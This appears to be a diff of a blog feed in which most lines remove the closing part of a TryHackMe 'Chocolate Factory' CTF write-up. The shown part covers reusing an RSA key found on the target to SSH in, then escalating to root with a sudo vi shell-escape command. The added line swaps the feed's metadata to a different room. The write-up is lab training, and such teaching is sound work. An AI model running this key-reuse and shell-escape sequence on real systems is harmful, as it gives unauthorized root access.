-<p>We found a RSA key in charlie’s directory</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa" /></p>
-
-<p>Let’s connect to charlie ssh.</p>
-
-<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
-$ ssh -i id_rsa charlie@10.10.153.7
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh" /></p>
-
-<p>And we are inside.</p>
-
-<p><br /></p>
-
-<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>
-
-<p>Now, let’s get the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag" /></p>
-
-<p><br /></p>
-
-<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>
-
-<p>Now, we checking the sudo privileges.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l" /></p>
-
-<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins" /></p>
-
-<p>Now, we can root privilege using this command.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc" /></p>
-
-<p>We are inside. Let’s get the root flag.</p>
-
-<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag" /></p>
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
